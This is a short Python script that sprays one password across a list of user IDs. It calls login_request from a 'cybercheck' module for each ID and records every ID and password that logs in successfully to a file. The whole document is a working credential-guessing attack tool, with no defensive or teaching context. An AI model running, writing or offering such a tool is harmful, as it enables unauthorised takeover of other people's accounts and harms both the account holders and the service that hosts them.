from sys import argv
import os
from cybercheck import *

id_file = os.path.dirname(__file__)+'user.txt'

def load_id():
    id_txt = open(id_file).read()
    lines = id_txt.split('\n')
    ids = map(lambda x: x.split(' '), lines)
    return ids

def main(ids):
    p = argv[1]
    fw = open("idsw.txt", "w")
    try:
        for line in ids:
            print ("Checking for: "+line[0])
            if login_request(line[0], p):
                print("Successful for: "+line[0])
                fw = open("idsw.txt", "a")
                fw.write(line[0]+" "+p+"\n")
                fw.close()
                logout_request(line[0])
    except KeyboardInterrupt:
        print("Stopped. Written to\'idsw.txt\'.")
    except Exception:
        print("Some Error Occured.")
    finally:
        fw.close()


if __name__ == "__main__":
    main(load_id())